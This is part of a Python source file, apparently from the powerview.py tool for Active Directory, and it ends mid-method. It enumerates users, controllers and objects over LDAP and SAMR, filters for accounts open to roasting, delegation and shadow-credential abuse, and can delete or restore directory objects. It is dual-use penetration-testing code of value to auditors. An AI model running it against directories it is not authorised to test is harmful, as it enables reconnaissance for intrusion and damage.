#!/usr/bin/env python3
from impacket.dcerpc.v5 import srvs, wkst, scmr, rrp, rprn
from powerview.lib.dfsnm import NetrDfsRemoveStdRoot, MSRPC_UUID_DFSNM
from impacket.dcerpc.v5.ndr import NULL
from impacket.crypto import encryptSecret
from typing import List, Optional

from powerview.modules.msa import MSA
from powerview.modules.ca import CAEnum, PARSE_TEMPLATE, UTILS
from powerview.modules.sccm import SCCM
from powerview.modules.addcomputer import ADDCOMPUTER
from powerview.modules.smbclient import SMBClient
from powerview.modules.kerberoast import GetUserSPNs
from powerview.modules.asreproast import ASREProast
from powerview.modules.dacledit import DACLedit
from powerview.modules.products import EDR
from powerview.modules.gpo import GPO
from powerview.modules.exchange import ExchangeEnum
from powerview.utils.helpers import *
from powerview.utils.connections import CONNECTION
from powerview.utils.storage import Storage
from powerview.utils.accesscontrol import AccessControl
from powerview.modules.ldapattack import (
	LDAPAttack,
	ACLEnum,
	ADUser,
	ObjectOwner,
	RBCD,
	Trust
)
from powerview.lib.adws.error import ADWSError
from powerview.utils.colors import bcolors
from powerview.utils.constants import (
	WELL_KNOWN_SIDS,
	KNOWN_SIDS,
	resolve_WellKnownSID,
	SERVICE_TYPE,
	SERVICE_START_TYPE,
	SERVICE_ERROR_CONTROL,
	SERVICE_STATUS,
	SERVICE_WIN32_EXIT_CODE,
	DMSA_DELEGATED_MSA_STATE,
	MSGBOX_TYPE
)
from powerview.lib.dns import (
	DNS_RECORD,
	DNS_RPC_RECORD_A,
	DNS_UTIL,
)
from powerview.lib.reg import RemoteOperations
from powerview.lib.samr import SamrObject
from powerview.lib.resolver import (
	UAC,
	LDAP
)
from powerview.lib.ldap3.extend import CustomExtendedOperationsRoot
from powerview.web.api.server import APIServer
from powerview.lib.tsts import TSHandler

import chardet
from io import BytesIO

import ldap3
from ldap3 import ALL_ATTRIBUTES
from ldap3.protocol.microsoft import security_descriptor_control, show_deleted_control, extended_dn_control
from ldap3.extend.microsoft import addMembersToGroups, modifyPassword, removeMembersFromGroups
from ldap3.utils.conv import escape_filter_chars
import re
import inspect
import sys
import random
import time
import contextlib

class PowerView:
	def __init__(self, conn, args, target_server=None, target_domain=None):
		self.conn = conn
		self.args = args
		
		if target_domain:
			self.domain = target_domain
		else:
			self.domain = self.conn.get_domain()
		
		if hasattr(conn, 'ldap_server') and hasattr(conn, 'ldap_session') and conn.ldap_server and conn.ldap_session and not conn.ldap_session.closed:
			self.ldap_server = conn.ldap_server
			self.ldap_session = conn.ldap_session
			logging.debug(f"Reusing existing LDAP session for domain {self.domain}")
		else:
			self.ldap_server, self.ldap_session = self.conn.init_ldap_session()

		self._initialize_attributes_from_connection()

		self.username = self.conn.username or args.username
		self.password = self.conn.password or args.password

		self.lmhash = self.conn.lmhash or args.lmhash
		self.nthash = self.conn.nthash or args.nthash
		self.auth_aes_key = self.conn.auth_aes_key or args.auth_aes_key
		self.nameserver = self.conn.nameserver or args.nameserver
		self.use_system_nameserver = self.conn.use_system_ns or args.use_system_ns
		self.dc_ip = self.conn.dc_ip or args.dc_ip
		self.use_kerberos = self.conn.use_kerberos or args.use_kerberos
		self.target_server = target_server

		if not target_domain and not args.no_admin_check:
			self.is_admin = self.is_admin()

		self.domain_instances = {}

		# API server
		if hasattr(self.args, 'web') and self.args.web and self.ldap_session:
			try:
				from powerview.web.api.server import APIServer
				self.api_server = APIServer(self, host=self.args.web_host, port=self.args.web_port)
				self.api_server.start()
			except ImportError:
				logging.warning("Web interface dependencies not installed. Web interface will not be available.")

		# MCP server
		if hasattr(self.args, 'mcp') and self.args.mcp and self.ldap_session:
			try:
				from powerview.mcp import MCPServer
				
				logging.info(f"Initializing MCP server with name '{args.mcp_name}' on {args.mcp_host}:{args.mcp_port}")
				self.mcp_server = MCPServer(
					powerview=self,
					name=self.args.mcp_name,
					host=self.args.mcp_host,
					port=self.args.mcp_port,
					path=self.args.mcp_path
				)
				self.mcp_server.start()
			except ImportError as e:
				logging.error(f"MCP error: {str(e)}")
				sys.exit(1)
			except AttributeError as e:
				logging.error(f"Error initializing MCP server: The MCP SDK API appears to be incompatible")
				logging.error(f"Please ensure you have the correct version of the MCP SDK installed")
				logging.error(f"Try installing from the GitHub repository: pip install powerview[mcp]")
				if args.stack_trace:
					raise
				sys.exit(1)
			except Exception as e:
				logging.error(f"Error initializing MCP server: {str(e)}")
				if args.stack_trace:
					raise
				sys.exit(1)

	def _initialize_attributes_from_connection(self):
		self.custom_paged_search = CustomExtendedOperationsRoot(self.ldap_session, server=self.ldap_server, obfuscate=self.args.obfuscate, no_cache=self.args.no_cache, no_vuln_check=self.args.no_vuln_check, use_adws=self.args.use_adws, raw=self.args.raw)
		if not hasattr(self.ldap_session, 'extend'):
			self.ldap_session.extend = type('ExtendedOperations', (), {'standard': type('StandardOperations', (), {})()})()
		self.ldap_session.extend.standard.paged_search = self.custom_paged_search.standard.paged_search
		self.ssl = self.ldap_session.server.ssl
		self.naming_contexts = self.ldap_server.info.naming_contexts
		self.forest_dn = self.ldap_server.info.other["rootDomainNamingContext"][0] if isinstance(self.ldap_server.info.other["rootDomainNamingContext"], list) else self.ldap_server.info.other["rootDomainNamingContext"]
		self.root_dn = self.ldap_server.info.other["defaultNamingContext"][0] if isinstance(self.ldap_server.info.other["defaultNamingContext"], list) else self.ldap_server.info.other["defaultNamingContext"]
		self.configuration_dn = self.ldap_server.info.other["configurationNamingContext"][0] if isinstance(self.ldap_server.info.other["configurationNamingContext"], list) else self.ldap_server.info.other["configurationNamingContext"]
		self.schema_dn = self.ldap_server.info.other["schemaNamingContext"][0] if isinstance(self.ldap_server.info.other["schemaNamingContext"], list) else self.ldap_server.info.other["schemaNamingContext"]
		if not self.domain:
			self.domain = dn2domain(self.root_dn)
		self.flatName = self.ldap_server.info.other["ldapServiceName"][0].split("@")[-1].split(".")[0] if isinstance(self.ldap_server.info.other["ldapServiceName"], list) else self.ldap_server.info.other["ldapServiceName"].split("@")[-1].split(".")[0]
		self.dc_dnshostname = self.ldap_server.info.other["dnsHostName"][0] if isinstance(self.ldap_server.info.other["dnsHostName"], list) else self.ldap_server.info.other["dnsHostName"]
		self.whoami = self.conn.who_am_i()

	def add_domain_connection(self, domain):
		"""Add a domain connection to the pool"""
		try:
			self.conn.add_domain_connection(domain)
			return True
		except Exception as e:
			logging.error(f"Failed to add domain {domain} to pool: {str(e)}")
			return False

	def get_domain_connection(self, domain=None):
		"""Get connection for specified domain"""
		return self.conn.get_domain_connection(domain)

	def add_primary_domain_to_pool(self):
		"""
		Initialize and add the primary domain connection to the connection pool.
		
		This should be called after PowerView initialization to ensure the primary
		domain connection is properly stored in the pool for reuse.
		"""
		try:
			primary_domain = self.conn.get_domain()
			
			if not self.conn.is_connection_alive():
				logging.warning(f"Primary domain connection for {primary_domain} is not alive, cannot add to pool")
				return False
			
			self.conn._connection_pool.add_connection(self.conn, primary_domain)
			logging.debug(f"Added primary domain connection for {primary_domain} to pool")
			return True
			
		except Exception as e:
			logging.error(f"Failed to initialize primary domain in pool: {str(e)}")
			if hasattr(self.args, 'stack_trace') and self.args.stack_trace:
				import traceback
				logging.debug(traceback.format_exc())
			return False

	def get_object_across_domains(self, identity=None, properties=[], target_domain=None):
		objects = []
		for domain in self.get_domaintrust(
			identity=target_domain,
			properties=['name'],
			no_cache=True,
		):
			trust_name = domain.get('attributes',{}).get('name',None)
			if trust_name:
				try:
					domain_conn = self.get_domain_connection(trust_name)
					temp_powerview = PowerView(domain_conn, self.args, target_domain=trust_name)
					objects.extend(temp_powerview.get_domainobject(
						identity=identity,
						properties=['name', 'objectSid', 'distinguishedName', 'objectCategory'],
						server=trust_name
					))
				except Exception as e:
					logging.error(f"Failed to query domain {trust_name}: {str(e)}")
					continue
		return objects

	def get_domain_sid(self):
		"""
		Returns the domain SID for the current domain.
		
		Returns:
			String: The domain SID.
		"""
		return self.get_domainobject(properties=['objectSid'])[0]['attributes']['objectSid']

	def get_target_domain(self):
		"""
		Returns the current target domain if operating in cross-domain mode.
		
		Returns:
			String: The target domain name or None if operating in the primary domain.
		"""
		if self.domain != self.conn.get_domain():
			return self.domain
		return None

	def get_admin_status(self):
		return self.is_admin

	def get_server_dns(self):
		return self.dc_dnshostname

	def _resolve_host(self, host_inp: Optional[str], server: Optional[str] = None) -> Optional[str]:
		if not host_inp:
			return None
		host = host_inp
		if not is_ipaddress(host):
			if server and server.casefold() != self.domain.casefold():
				if not host.endswith(server):
					host = f"{host}.{server}"
			else:
				if not is_valid_fqdn(host):
					host = f"{host}.{self.domain}"
		if self.use_kerberos:
			if is_ipaddress(host):
				logging.error('FQDN must be used for kerberos')
				return None
			return host
		if is_valid_fqdn(host):
			return host2ip(host, self.nameserver, 3, True, use_system_ns=self.use_system_nameserver)
		return host

	def get_domain_powerview(self, domain):
		"""Get or create a PowerView instance for a specific domain with robust
		error handling and connection verification
		
		Args:
			domain (str): Target domain name
			
		Returns:
			PowerView: PowerView instance for the target domain
		"""
		if not domain or domain.lower() == self.domain.lower():
			return self
			
		domain = domain.lower()
		
		if domain in self.domain_instances:
			pv = self.domain_instances[domain]
			try:
				if not pv.ldap_session.closed:
					return pv
				else:
					logging.debug(f"Cached PowerView for domain {domain} has dead connection, recreating")
					del self.domain_instances[domain]
			except Exception as e:
				logging.debug(f"Error checking PowerView for domain {domain}, recreating: {str(e)}")
				if domain in self.domain_instances:
					del self.domain_instances[domain]
		
		max_retries = 3
		backoff_factor = 1.5
		retry_count = 0
		
		while retry_count < max_retries:
			try:
				domain_conn = self.conn.get_domain_connection(domain)
				
				if not hasattr(domain_conn, 'ldap_session') or not domain_conn.ldap_session:
					raise ConnectionError(f"Connection to domain {domain} doesn't have an initialized LDAP session")
				
				pv = PowerView(domain_conn, self.args, target_domain=domain)
				
				if pv.ldap_session.closed:
					raise ConnectionError(f"Created PowerView for {domain} but connection is not alive")
				
				self.domain_instances[domain] = pv
				logging.debug(f"Successfully created PowerView instance for domain {domain}")
				return pv
				
			except Exception as e:
				retry_count += 1
				if retry_count >= max_retries:
					logging.error(f"Failed to create PowerView for domain {domain} after {max_retries} attempts: {str(e)}")
					raise
				
				wait_time = (backoff_factor ** retry_count) * 0.5
				logging.debug(f"Retrying connection to {domain} in {wait_time:.2f} seconds (attempt {retry_count+1}/{max_retries})")
				time.sleep(wait_time)

	def execute_in_domain(self, domain, func, *args, **kwargs):
		"""Execute a function in the context of a specific domain with robust error handling
		
		Args:
			domain (str): Target domain
			func (callable): Function to execute
			*args, **kwargs: Arguments to pass to the function
			
		Returns:
			The result of the function execution
		"""
		if not domain or domain.lower() == self.domain.lower():
			return func(*args, **kwargs)
		
		try:
			domain_pv = self.get_domain_powerview(domain)
			
			if not hasattr(domain_pv, func.__name__):
				raise AttributeError(f"Function {func.__name__} not found in PowerView for domain {domain}")
			
			result = getattr(domain_pv, func.__name__)(*args, **kwargs)
			return result
			
		except Exception as e:
			logging.error(f"Failed to execute {func.__name__} in domain {domain}: {str(e)}")
			if hasattr(self.args, 'stack_trace') and self.args.stack_trace:
				import traceback
				logging.debug(traceback.format_exc())
			raise

	def execute(self, args):
		module_name = args.module
		method_name = module_name.replace('-', '_').lower()
		method = getattr(self, method_name, None)
		if not method:
			raise ValueError(f"Method {method_name} not found in PowerView")
		# Get the method's signature
		method_signature = inspect.signature(method)
		method_params = method_signature.parameters
		# Filter out unsupported arguments
		method_args = {k: v for k, v in vars(args).items() if k in method_params}
		return method(**method_args)

	def is_admin(self):
		self.is_domainadmin = False
		self.is_admincount = False
		try:
			user_entry = self.get_domainobject(identity=self.username, properties=["distinguishedName", "adminCount"])
			if len(user_entry) == 0:
				return False
			attrs = user_entry[0].get("attributes", {})
			user_dn = attrs.get("distinguishedName")
			if not user_dn:
				return False
			sids = []
			for attr in ("tokenGroups", "tokenGroupsGlobalAndUniversal", "tokenGroupsNoGCAcceptable"):
				try:
					self.ldap_session.search(user_dn, "(1.2.840.113556.1.4.2=*)", attributes=[attr], search_scope=ldap3.BASE)
					if not self.ldap_session.response:
						continue
					values = self.ldap_session.response[0].get("attributes", {}).get(attr)
					if not values:
						continue
					if isinstance(values, list):
						for v in values:
							if isinstance(v, str):
								sids.append(v)
							else:
								sids.append(LDAP.bin_to_sid(bytes(v)))
					else:
						if isinstance(values, str):
							sids.append(values)
						else:
							sids.append(LDAP.bin_to_sid(bytes(values)))
				except Exception:
					continue
			for sid in sids:
				if sid.endswith("-512") or sid.endswith("-518") or sid.endswith("-519") or sid == "S-1-5-32-544":
					self.is_domainadmin = True
					break
			if self.is_domainadmin:
				logging.info(f"User {self.username} is a Domain Admin")
			else:
				self.is_admincount = bool(attrs.get("adminCount", 0))
				if self.is_admincount:
					logging.info(f"User {self.username} has adminCount attribute set to 1. Might be admin somewhere somehow :)")
		except Exception:
			if self.args.stack_trace:
				raise
			else:
				logging.debug("Failed to check user admin status")
		return self.is_domainadmin or self.is_admincount

	def clear_cache(self) -> bool:
		logging.info("[Clear-Cache] Clearing cache")
		return self.custom_paged_search.standard.storage.clear_cache()

	def get_domainuser(self, args=None, properties=[], identity=None, searchbase=None, search_scope=ldap3.SUBTREE, no_cache=False, no_vuln_check=False, raw=False):
		def_prop = [
			'objectClass', 'servicePrincipalName', 'objectCategory', 'objectGUID', 'primaryGroupID', 'userAccountControl',
			'sAMAccountType', 'adminCount', 'cn', 'name', 'sAMAccountName', 'distinguishedName', 'mail',
			'description', 'lastLogoff', 'lastLogon', 'memberOf', 'objectSid', 'userPrincipalName', 
			'pwdLastSet', 'badPwdCount', 'badPasswordTime', 'msDS-SupportedEncryptionTypes', 'lastLogonTimestamp', 'department', 'title'
		]
		
		if args and hasattr(args, 'properties') and args.properties:
			properties = set(args.properties)
		else:
			properties = set(properties or def_prop)

		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw
		controls = []

		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn 

		logging.debug(f"[Get-DomainUser] Using search base: {searchbase}")

		ldap_filter = ""
		identity_filter = ""

		if identity:
			if is_dn(identity):
				identity_filter += f"(distinguishedName={identity})"
			else:
				identity_filter += f"(|(sAMAccountName={identity})(name={identity})(cn={identity}))"
		elif args and hasattr(args, 'identity') and args.identity:
			if is_dn(args.identity):
				identity_filter += f"(distinguishedName={args.identity})"
			else:
				identity_filter += f"(|(sAMAccountName={args.identity})(name={args.identity})(cn={args.identity}))"

		if args:
			if hasattr(args, 'preauthnotrequired') and args.preauthnotrequired:
				logging.debug("[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate")
				ldap_filter += f'(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
			if hasattr(args, 'passnotrequired') and args.passnotrequired:
				logging.debug("[Get-DomainUser] Searching for user accounts that have PASSWD_NOTREQD set")
				ldap_filter += f'(userAccountControl:1.2.840.113556.1.4.803:=32)'
			if hasattr(args, 'admincount') and args.admincount:
				logging.debug('[Get-DomainUser] Searching for adminCount=1')
				ldap_filter += f'(admincount=1)'
			if hasattr(args, 'lockout') and args.lockout:
				logging.debug('[Get-DomainUser] Searching for locked out user')
				ldap_filter += f'(userAccountControl:1.2.840.113556.1.4.803:=16)'
			if hasattr(args, 'allowdelegation') and args.allowdelegation:
				logging.debug('[Get-DomainUser] Searching for users who can be delegated')
				ldap_filter += f'(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
			if hasattr(args, 'disallowdelegation') and args.disallowdelegation:	
				logging.debug('[Get-DomainUser] Searching for users who are sensitive and not trusted for delegation')
				ldap_filter += f'(userAccountControl:1.2.840.113556.1.4.803:=1048576)'
			if hasattr(args, 'trustedtoauth') and args.trustedtoauth:
				logging.debug('[Get-DomainUser] Searching for users that are trusted to authenticate for other principals')
				ldap_filter += f'(userAccountControl:1.2.840.113556.1.4.803:=16777216)'
				properties.add('msds-AllowedToDelegateTo')
			if hasattr(args, 'rbcd') and args.rbcd:
				logging.debug('[Get-DomainUser] Searching for users that are configured to allow resource-based constrained delegation')
				ldap_filter += f'(msds-allowedtoactonbehalfofotheridentity=*)'
			if hasattr(args, 'shadowcred') and args.shadowcred:
				logging.debug("[Get-DomainUser] Searching for users that are configured to have msDS-KeyCredentialLink attribute set")
				ldap_filter += f'(msDS-KeyCredentialLink=*)'
				properties.add('msDS-KeyCredentialLink')
			if hasattr(args, 'spn') and args.spn:
				logging.debug("[Get-DomainUser] Searching for users that have SPN attribute set")
				ldap_filter += f'(&(servicePrincipalName=*)(!(name=krbtgt)))'
			if hasattr(args, 'unconstrained') and args.unconstrained:
				logging.debug("[Get-DomainUser] Searching for users configured for unconstrained delegation")
				ldap_filter += f'(userAccountControl:1.2.840.113556.1.4.803:=524288)'
			if hasattr(args, 'enabled') and args.enabled:
				logging.debug("[Get-DomainUser] Searching for enabled user")
				ldap_filter += f'(!(userAccountControl:1.2.840.113556.1.4.803:=2))'
			if hasattr(args, 'disabled') and args.disabled:
				logging.debug("[Get-DomainUser] Searching for disabled user")
				ldap_filter += f'(userAccountControl:1.2.840.113556.1.4.803:=2)'
			if hasattr(args, 'password_expired') and args.password_expired:
				logging.debug("[Get-DomainUser] Searching for user with expired password")
				ldap_filter += f'(userAccountControl:1.2.840.113556.1.4.803:=8388608)'
			if hasattr(args, 'memberof') and args.memberof:
				logging.debug("[Get-DomainUser] Searching for user accounts that are members of a group")
				memberdn = args.memberof
				if not is_dn(memberdn):
					group = self.get_domaingroup(identity=memberdn, properties=["distinguishedName"])
					if len(group) == 0:
						logging.error(f"[Get-DomainUser] Group {memberdn} not found")
						return
					memberdn = group[0].get("attributes").get("distinguishedName")
				ldap_filter += f'(memberOf={memberdn})'
			if hasattr(args, 'department') and args.department:
				logging.debug("[Get-DomainUser] Searching for user accounts that are members of a department")
				ldap_filter += f'(department={args.department})'
			if hasattr(args, 'ldapfilter') and args.ldapfilter:
				logging.debug(f'[Get-DomainUser] Using additional LDAP filter: {args.ldapfilter}')
				ldap_filter += f'{args.ldapfilter}'

		ldap_filter = f'(&(samAccountType=805306368){identity_filter}{ldap_filter})'

		logging.debug(f'[Get-DomainUser] LDAP search filter: {ldap_filter}')

		# in case need more then 1000 entries
		return self.ldap_session.extend.standard.paged_search(
			searchbase,
			ldap_filter,
			attributes=list(properties),
			paged_size = 1000,
			generator=True,
			search_scope=search_scope,
			no_cache=no_cache,
			no_vuln_check=no_vuln_check,
			raw=raw,
			controls=controls
		)

	def get_localuser(self, computer_name, identity=None, properties=[], port=445, args=None):
		entries = list()

		if computer_name is None:
			#computer_name = host2ip(self.get_server_dns(), self.nameserver, 3, True, use_system_ns=self.use_system_nameserver, type=list)
			computer_name = self.get_server_dns()

		default_properties = {'username', 'userrid', 'fullname', 'homedirectory', 'allowedworkstation', 
						  'comment', 'accountactive', 'passwordlastset', 'passwordexpires', 
						  'lastlogon', 'logoncount', 'localgroupmemberships', 'globalgroupmemberships'}
	
		properties = set(prop.lower() for prop in (properties or default_properties))

		invalid_properties = properties - default_properties
		if invalid_properties:
			logging.error(f"[Get-LocalUser] Invalid properties: {', '.join(invalid_properties)}")
			return

		if is_ipaddress(computer_name) and self.use_kerberos:
			logging.error("[Get-NetLoggedOn] Use FQDN when using kerberos")
			return

		samrobj = SamrObject(
			connection = self.conn,
			port = port
		)

		dce = samrobj.connect(computer_name)
		samrh = samrobj.open_handle(dce)

		rids = list()
		if identity:
			rid = samrobj.get_object_rid(dce, samrh, identity)
			if rid is None:
				return
			rids.append(rid)
		else:
			users = samrobj.get_all_local_users(dce, samrh)
			rids = [user['RelativeId'] for user in users]

		if not rids:
			logging.error("No RIDs found. Skipping...")
			return

		logging.debug("[Get-LocalAccount] Found RIDs {}".format(rids))


		for rid in rids:
			entry = dict({
				"attributes": dict()
			})
			samrh = samrobj.open_handle(dce)
			user_info = samrobj.get_local_user(dce, samrh, rid)

			if 'username' in properties:
				entry['attributes']['userName'] = user_info['UserName']
			if 'userrid' in properties:
				entry['attributes']['userRID'] = rid
			if 'fullname' in properties:
				entry['attributes']['fullName'] = user_info['FullName']
			if 'homedirectory' in properties:
				entry['attributes']['homeDirectory'] = user_info['HomeDirectory']
			if 'allowedworkstation' in properties:
				entry['attributes']['allowedWorkstation'] = "All" if not user_info['WorkStations'] else user_info['WorkStations']
			if 'comment' in properties:
				entry['attributes']['comment'] = user_info['AdminComment']
			if 'accountactive' in properties:
				entry['attributes']['accountActive'] = user_info['UserAccountControl'] & samr.USER_ACCOUNT_DISABLED != samr.USER_ACCOUNT_DISABLED
			if 'passwordlastset' in properties:
				entry['attributes']['passwordLastSet'] = get_time_string(user_info['PasswordLastSet'])
			if 'passwordexpires' in properties:
				entry['attributes']['passwordExpires'] = get_time_string(user_info['PasswordMustChange'])
			if 'lastlogon' in properties:
				entry['attributes']['lastLogon'] = get_time_string(user_info['LastLogon'])
			if 'logoncount' in properties:
				entry['attributes']['logonCount'] = user_info['LogonCount']
			if 'localgroupmemberships' in properties:
				entry['attributes']['localGroupMemberships'] = user_info['LocalGroups']
			if 'globalgroupmemberships' in properties:
				entry['attributes']['globalGroupMemberships'] = user_info['GlobalGroups']

			entries.append(entry)
		return entries

	def get_domaincontroller(self, args=None, properties=[], identity=None, searchbase=None, search_scope=ldap3.SUBTREE, no_cache=False, no_vuln_check=False, raw=False):
		def_prop = [
			'cn',
			'distinguishedName',
			'instanceType',
			'whenCreated',
			'whenChanged',
			'name',
			'objectGUID',
			'userAccountControl',
			'badPwdCount',
			'badPasswordTime',
			'objectSid',
			'logonCount',
			'sAMAccountType',
			'sAMAccountName',
			'operatingSystem',
			'dNSHostName',
			'objectCategory',
			'msDS-SupportedEncryptionTypes',
			'msDS-AllowedToActOnBehalfOfOtherIdentity'
		]
		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		properties = args.properties if hasattr(args, 'properties') and args.properties else properties
		if not properties:
			properties = def_prop
		searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else searchbase

		ldap_filter = ""
		identity_filter = ""

		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw

		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn 
		
		logging.debug(f"[Get-DomainController] Using search base: {searchbase}")

		if identity:
			identity_filter += f"(|(name={identity})(sAMAccountName={identity})(dnsHostName={identity}))"

		if args:
			if args.ldapfilter:
				logging.debug(f'[Get-DomainController] Using additional LDAP filter: {args.ldapfilter}')
				ldap_filter += args.ldapfilter

		ldap_filter = f"(&(userAccountControl:1.2.840.113556.1.4.803:=8192){identity_filter}{ldap_filter})"
		logging.debug(f"[Get-DomainController] LDAP search filter: {ldap_filter}")
		entries = []
		entries = self.ldap_session.extend.standard.paged_search(
			searchbase,
			ldap_filter,
			attributes=properties,
			paged_size = 1000,
			generator=True,
			search_scope=search_scope,
			no_cache=no_cache,
			no_vuln_check=no_vuln_check,
			raw=raw
		
		)

		for entry in entries:
			if hasattr(args, 'resolvesids') and args.resolvesids:
				try:
					allowed_to_act = entry["attributes"].get("msDS-AllowedToActOnBehalfOfOtherIdentity", None)
					if allowed_to_act is not None:
						if isinstance(allowed_to_act, list):
							resolved_sids = []
							for sid in allowed_to_act:
								resolved_sids.append(self.convertfrom_sid(sid))
							entry["attributes"]["msDS-AllowedToActOnBehalfOfOtherIdentity"] = resolved_sids
						else:
							entry["attributes"]["msDS-AllowedToActOnBehalfOfOtherIdentity"] = self.convertfrom_sid(allowed_to_act)
				except Exception as e:
					logging.debug(f"[Get-DomainController] Error resolving sids: {str(e)}")

		return entries

	def get_domainobject(self, args=None, properties=[], identity=None, identity_filter=None, ldap_filter=None, searchbase=None, sd_flag=None, include_deleted=False, search_scope=ldap3.SUBTREE, no_cache=False, no_vuln_check=False, raw=False):
		def_prop = [
			ldap3.ALL_ATTRIBUTES
		]
		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		properties = args.properties if hasattr(args, 'properties') and args.properties else properties
		include_deleted = args.include_deleted if hasattr(args, 'include_deleted') and args.include_deleted else include_deleted
		properties = set(properties or def_prop)
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw

		controls = []
		if sd_flag:
			controls.extend(security_descriptor_control(sdflags=sd_flag))

		if include_deleted:
			controls.append(show_deleted_control(criticality=True))

		identity_filter = "" if not identity_filter else identity_filter
		ldap_filter = "" if not ldap_filter else ldap_filter
		if identity and not identity_filter:
			if is_dn(identity):
				identity_filter = f"(distinguishedName={identity})"
			else:
				identity_filter = f"(|(samAccountName={identity})(name={identity})(displayName={identity})(objectSid={identity})(distinguishedName={identity})(dnsHostName={identity})(objectGUID=*{identity}*))"
		
		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn

		logging.debug(f"[Get-DomainObject] Using search base: {searchbase}")
		if args:
			if hasattr(args, 'ldapfilter') and args.ldapfilter:
				logging.debug(f'[Get-DomainObject] Using additional LDAP filter from args: {args.ldapfilter}')
				ldap_filter = f"{args.ldapfilter}"
			
			if hasattr(args, 'deleted') and args.deleted:
				logging.debug(f'[Get-DomainObject] Using deleted flag from args: {args.deleted}')
				ldap_filter += f"(isDeleted=*)"

		ldap_filter = f'(&(1.2.840.113556.1.4.2=*){identity_filter}{ldap_filter})'
		logging.debug(f'[Get-DomainObject] LDAP search filter: {ldap_filter}')
		entries = self.ldap_session.extend.standard.paged_search(
			searchbase,
			ldap_filter,
			attributes=list(properties),
			paged_size = 1000,
			generator=True,
			controls=controls,
			search_scope=search_scope,
			no_cache=no_cache,
			no_vuln_check=no_vuln_check,
			raw=raw
		)

		return entries

	def restore_domainobject(self, identity=None, new_name=None, targetpath=None, args=None):
		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		new_name = args.new_name if hasattr(args, 'new_name') and args.new_name else None
		targetpath = args.targetpath if hasattr(args, 'targetpath') and args.targetpath else None
		searchbase = f"CN=Deleted Objects,{self.root_dn}"

		logging.debug(f"[Restore-DomainObject] Searching for {identity} in deleted objects container")
		entries = self.get_domainobject(
			identity=identity,
			searchbase=searchbase,
			include_deleted=True
		)
		if len(entries) == 0:
			logging.error(f"[Restore-DomainObject] {identity} not found in domain")
			return False
		elif len(entries) > 1:
			logging.error(f"[Restore-DomainObject] More than one object found. Use objectSid instead.")
			return False

		entry = entries[0]
		entry_attributes = entry.get('attributes', {})
		entry_dn = entry_attributes.get('distinguishedName')
		entry_san = entry_attributes.get('sAMAccountName')
		entry_name = entry_attributes.get('name')
		entry_rdn = entry_attributes.get('msDS-LastKnownRDN')
		entry_last_parent = entry_attributes.get('lastKnownParent')

		if not entry_dn:
			logging.error(f"[Restore-DomainObject] Object has no distinguishedName")
			return False

		basedn = entry_last_parent if entry_last_parent else self.root_dn
		if targetpath:
			basedn = targetpath

		if entry_rdn:
			new_dn = f"CN={entry_rdn},{basedn}"
		elif entry_san:
			new_dn = f"CN={entry_san},{basedn}"
		elif entry_name:
			new_dn = f"CN={entry_name},{basedn}"
		else:
			cn_from_dn = entry_dn.split(',')[0].replace('CN=', '') if 'CN=' in entry_dn else 'UnknownObject'
			new_dn = f"CN={cn_from_dn},{basedn}"

		logging.debug(f"[Restore-DomainObject] Found {entry_dn} in deleted objects container")
		logging.warning(f"[Restore-DomainObject] Recovering object from deleted objects container into {new_dn}")
		
		obj = {
			'isDeleted': [
				(ldap3.MODIFY_DELETE, [])
			],
			'distinguishedName': [
				(ldap3.MODIFY_REPLACE, [new_dn])
			]
		}

		if new_name:
			if entry_san and entry_san.lower() != new_name.lower():
				obj['sAMAccountName'] = [
					(ldap3.MODIFY_REPLACE, [new_name])
				]

		succeeded = self.ldap_session.modify(
			entry_dn, 
			obj,
			controls=[
				show_deleted_control(criticality=True),
				extended_dn_control(criticality=True)
			]
		)
		if not succeeded:
			logging.error(f"[Restore-DomainObject] Failed to restore {entry_san}")
			return False
		else:
			logging.info(f'[Restore-DomainObject] Success! {entry_san} restored')
			return True

	def remove_domainobject(self, identity, searchbase=None, args=None, search_scope=ldap3.SUBTREE):
		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn

		targetobject = self.get_domainobject(identity=identity, properties=[
			'sAMAccountname',
			'ObjectSID',
			'distinguishedName',
		], searchbase=searchbase, search_scope=search_scope)
		
		# verify if the identity exists
		if len(targetobject) > 1:
			logging.error(f"[Remove-DomainObject] More than one object found")
			return False
		elif len(targetobject) == 0:
			logging.error(f"[Remove-DomainObject] {identity} not found in domain")
			return False

		if isinstance(targetobject, list):
			targetobject_dn = targetobject[0]["attributes"]["distinguishedName"]
		else:
			targetobject_dn = targetobject["attributes"]["distinguishedName"]

		logging.debug(f"[Remove-DomainObject] Found {targetobject_dn} in domain")
		logging.warning(f"[Remove-DomainObject] Removing object from domain")
		
		succeeded = self.ldap_session.delete(targetobject_dn)

		if not succeeded:
			logging.error(self.ldap_session.result['message'] if self.args.debug else f"[Remove-DomainObject] Failed to modify, view debug message with --debug")
		else:
			logging.info(f'[Remove-DomainObject] Success! {targetobject_dn} removed')
		
		return succeeded

	def get_domainobjectowner(self, identity=None, ldapfilter=None, searchbase=None, args=None, search_scope=ldap3.SUBTREE, no_cache=False, no_vuln_check=False, raw=False):
